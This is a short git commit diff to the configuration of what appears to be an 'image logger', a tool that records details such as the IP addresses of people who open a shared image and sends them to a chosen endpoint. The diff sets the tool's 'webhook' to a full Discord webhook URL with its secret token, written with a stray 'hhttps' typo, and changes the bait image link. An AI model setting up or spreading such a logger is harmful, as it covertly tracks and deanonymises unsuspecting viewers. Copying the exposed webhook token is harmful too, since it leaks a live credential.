8842b3542624c623ca07821b69a814b03cb21c1f
notsnvzlolsnvz-cell <notsnvzlolsnvz@gmail.com>
2025-09-13 13:07:03 +0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://cdn.corenexis.com/files/b/4256575168.png",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "hhttps://discord.com/api/webhooks/1416133163461246996/fdNBgHMhNKceB9K4OhrOpjOi6I9VhmWbRR02ND9nhpXPi-BIexngx-TzWNVoLSILBrZS",
+    "image": "https://cdn.corenexis.com/files/b/4256575168.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
